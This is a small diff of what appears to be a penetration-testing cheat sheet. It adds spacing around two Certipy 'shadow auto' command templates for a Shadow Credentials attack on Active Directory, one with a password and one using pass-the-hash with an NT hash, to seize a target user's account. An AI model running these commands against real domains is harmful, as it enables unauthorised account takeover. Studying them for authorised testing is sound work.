@@ -11,7 +11,9 @@ ____________________________________________________
  * REQUIREMENTS: Get certipy (or certipy-ad in kali) AND UPDATE IT to the last version -> https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation
 
  You can do this attack with password or NT Hash wit pass the hash technique:
+ 
 ` < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -p <password> -account <target user> `
+
 ` < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -hashes :<your user NT hash here> -account <target user> `
 
 
